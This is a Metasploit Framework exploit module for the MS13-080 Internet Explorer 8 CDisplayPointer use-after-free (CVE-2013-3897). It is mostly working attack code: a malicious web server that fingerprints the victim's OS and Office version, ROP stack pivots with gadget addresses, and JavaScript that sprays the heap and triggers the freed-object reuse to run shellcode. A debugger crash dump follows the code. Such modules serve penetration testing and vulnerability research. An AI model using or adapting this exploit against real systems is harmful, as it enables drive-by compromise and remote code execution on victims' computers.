##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb
  include Msf::Exploit::Remote::BrowserAutopwn

  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "8.0",
    :ua_maxver  => "8.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :rank       => NormalRanking
  })

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS13-080 Microsoft Internet Explorer CDisplayPointer Use-After-Free",
      'Description'    => %q{
        This module exploits a vulnerability found in Microsoft Internet Explorer. It was originally
        found being exploited in the wild targeting Japanese and Korean IE8 users on Windows XP,
        around the same time frame as CVE-2013-3893, except this was kept out of the public eye by
        multiple research companies and the vendor until the October patch release.

        This issue is a use-after-free vulnerability in CDisplayPointer via the use of a
        "onpropertychange" event handler. To set up the appropriate buggy conditions, we first craft
        the DOM tree in a specific order, where a CBlockElement comes after the CTextArea element.
        If we use a select() function for the CTextArea element, two important things will happen:
        a CDisplayPointer object will be created for CTextArea, and it will also trigger another
        event called "onselect". The "onselect" event will allow us to set up for the actual event
        handler we want to abuse - the "onpropertychange" event. Since the CBlockElement is a child
        of CTextArea, if we do a node swap of CBlockElement in "onselect", this will trigger
        "onpropertychange".  During "onpropertychange" event handling, a free of the CDisplayPointer
        object can be forced by using an "Unslect" (other approaches also apply), but a reference
        of this freed memory will still be kept by CDoc::ScrollPointerIntoView, specifically after
        the CDoc::GetLineInfo call, because it is still trying to use that to update
        CDisplayPointer's position. When this invalid reference arrives in QIClassID, a crash
        finally occurs due to accessing the freed memory. By controlling this freed memory, it is
        possible to achieve arbitrary code execution under the context of the user.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown', # Exploit in the wild
          'sinn3r'   # Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2013-3897' ],
          [ 'OSVDB', '98207' ],
          [ 'MSB', 'MS13-080' ],
          [ 'URL', 'http://blogs.technet.com/b/srd/archive/2013/10/08/ms13-080-addresses-two-vulnerabilities-under-limited-targeted-attacks.aspx' ],
          [ 'URL', 'http://jsunpack.jeek.org/?report=847afb154a4e876d61f93404842d9a1b93a774fb' ]
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
          [ 'IE 8 on Windows XP SP3', {} ],
          [ 'IE 8 on Windows 7',      {} ]
        ],
      'Payload'        =>
        {
          'BadChars'       => "\x00",
          'PrependEncoder' => "\x81\xc4\x0c\xfe\xff\xff" # add esp, -500
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Privileged'     => false,
      # Jsunpack first received a sample to analyze on Sep 12 2013.
      # MSFT patched this on Oct 8th.
      'DisclosureDate' => "Oct 08 2013",
      'DefaultTarget'  => 0))
  end

  def get_check_html
    %Q|<html>
<script>
#{js_os_detect}

function os() {
  var detect = window.os_detect.getVersion();
  var os_string = detect.os_name + " " + detect.os_flavor + " " + detect.ua_name + " " + detect.ua_version;
  return os_string;
}

function dll() {
  var checka = 0;
  var checkb = 0;
  try {
    checka = new ActiveXObject("SharePoint.OpenDocuments.4");
  } catch (e) {}

  try {
    checkb = new ActiveXObject("SharePoint.OpenDocuments.3");
  } catch (e) {}

  if ((typeof checka) == "object" && (typeof checkb) == "object") {
    try{location.href='ms-help://'} catch(e){}
    return "#{@js_office_2010_str}";
  }
  else if ((typeof checka) == "number" && (typeof checkb) == "object") {
    try{location.href='ms-help://'} catch(e){}
    return "#{@js_office_2007_str}";
  }
  return "#{@js_default_str}";
}

window.onload = function() {
  window.location = "#{get_resource}/search?o=" + escape(os()) + "&d=" + dll();
}
</script>
</html>
    |
  end

  def junk
    rand_text_alpha(4).unpack("V")[0].to_i
  end

  def get_payload(target_info)
    rop_payload = ''
    os          = target_info[:os]
    dll_used    = ''

    case target_info[:dll]
    when @js_office_2007_str
      dll_used = "Office 2007"

      pivot =
      [
        0x51c2213f, # xchg eax,esp # popad # add byte ptr [eax],al # retn 4
        junk,       # ESI due to POPAD
        junk,       # EBP due to POPAD
        junk,
        junk,       # EBX due to POPAD
        junk,       # EDX due to POPAD
        junk,       # ECX due to POPAD
        0x51c5d0a7, # EAX due to POPAD (must be writable for the add instruction)
        0x51bd81db, # ROP NOP
        junk        # Padding for the retn 4 from the stack pivot
      ].pack("V*")

      rop_payload = generate_rop_payload('hxds', payload.encoded, {'target'=>'2007', 'pivot'=>pivot})

    when @js_office_2010_str
      dll_used = "Office 2010"

      pivot =
      [
        0x51c00e64, # xchg eax, esp; add eax, [eax]; add esp, 10; mov eax,esi; pop esi; pop ebp; retn 4
        junk,
        junk,
        junk,
        junk,
        junk,
        0x51BE7E9A, # ROP NOP
        junk        # Padding for the retn 4 from the stack pivot
      ].pack("V*")

      rop_payload = generate_rop_payload('hxds', payload.encoded, {'target'=>'2010', 'pivot'=>pivot})

    when @js_default_str
      if target_info[:os] =~ /windows xp/i
        # XP uses msvcrt.dll
        dll_used = "msvcrt"

        pivot =
        [
          0x77C3868A # xchg eax,esp; rcr [ebx-75], 0c1h; pop ebp; ret
        ].pack("V*")

        rop_payload = generate_rop_payload('msvcrt', payload.encoded, {'target'=>'xp', 'pivot'=>pivot})
      else
        # Assuming this is Win 7, and we'll use Java 6 ROP
        dll_used = "Java"

        pivot =
        [
          0x7c342643, # xchg eax,esp # pop edi # add byte ptr [eax],al # pop ecx # retn
          junk        # Padding for the POP ECX
        ].pack("V*")

        rop_payload = generate_rop_payload('java', payload.encoded, {'pivot'=>pivot})
      end
    end

    print_status("Target uses #{os} with #{dll_used} DLL")

    rop_payload
  end

  def get_sploit_html(target_info)
    os         = target_info[:os]
    js_payload = ''

    if os =~ /Windows (7|XP) MSIE 8\.0/
      js_payload = Rex::Text.to_unescape(get_payload(target_info))
    else
      print_error("Target not supported by this attack.")
      return ""
    end

    %Q|<html>
<head>
<script>
#{js_property_spray}
sprayHeap({shellcode:unescape("#{js_payload}")});

var earth = document;
var data = "";
for (i=0; i<17; i++) {
  if (i==7) { data += unescape("%u2020%u2030"); }
  else      { data += "\\u4141\\u4141"; }
}
data += "\\u4141";

function butterfly() {
  for(i=0; i<20; i++) {
    var effect = earth.createElement("div");
    effect.className = data;
  }
}

function kaiju() {
  var godzilla = earth.createElement("textarea");
  var minilla = earth.createElement("pre");
  earth.body.appendChild(godzilla);
  earth.body.appendChild(minilla);
  godzilla.appendChild(minilla);

  godzilla.onselect=function(e) {
    minilla.swapNode(earth.createElement("div"));
  }

  var battleStation = false;
  var war = new Array();
  godzilla.onpropertychange=function(e) {
    if (battleStation == true) {
      for (i=0; i<50; i++) {
        war.push(earth.createElement("span"));
      }
    }

    earth.execCommand("Unselect");

    if (battleStation == true) {
      for (i=0; i < war.length; i++) {
        war[i].className = data;
      }
    }
    else {
      battleStation = true;
    }
  }

  butterfly();
  godzilla.select();
}
</script>
</head>
<body onload='kaiju()'>
</body>
</html>
    |
  end


  def on_request_uri(cli, request)
    if request.uri =~ /search\?o=(.+)\&d=(.+)$/
      target_info = { :os => Rex::Text.uri_decode($1), :dll => Rex::Text.uri_decode($2) }
      sploit = get_sploit_html(target_info)
      send_response(cli, sploit, {'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache'})
      return
    end

    html = get_check_html
    print_status("Checking out target...")
    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache'})
  end

  def exploit
    @js_office_2007_str = Rex::Text.rand_text_alpha(4)
    @js_office_2010_str = Rex::Text.rand_text_alpha(5)
    @js_default_str     = Rex::Text.rand_text_alpha(6)
    super
  end

end


=begin

+hpa this for debugging or you might not see a crash at all :-)

0:005> r
eax=d6091326 ebx=0777efd4 ecx=00000578 edx=000000c8 esi=043bbfd0 edi=043bbf9c
eip=6d6dc123 esp=043bbf7c ebp=043bbfa0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!QIClassID+0x30:
6d6dc123 8b03            mov     eax,dword ptr [ebx]  ds:0023:0777efd4=????????
0:005> u
mshtml!QIClassID+0x30:
6d6dc123 8b03            mov     eax,dword ptr [ebx]
6d6dc125 8365e800        and     dword ptr [ebp-18h],0
6d6dc129 8d4de8          lea     ecx,[ebp-18h]
6d6dc12c 51              push    ecx
6d6dc12d 6870c16d6d      push    offset mshtml!IID_IProxyManager (6d6dc170)
6d6dc132 53              push    ebx
6d6dc133 bf02400080      mov     edi,80004002h
6d6dc138 ff10            call    dword ptr [eax]

=end


